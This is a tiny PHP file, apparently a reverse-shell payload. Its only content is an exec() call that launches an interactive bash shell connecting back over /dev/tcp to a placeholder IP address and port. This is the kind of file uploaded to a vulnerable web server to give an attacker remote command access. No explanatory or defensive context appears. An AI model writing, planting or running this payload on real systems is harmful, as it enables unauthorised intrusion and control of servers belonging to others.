<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
?>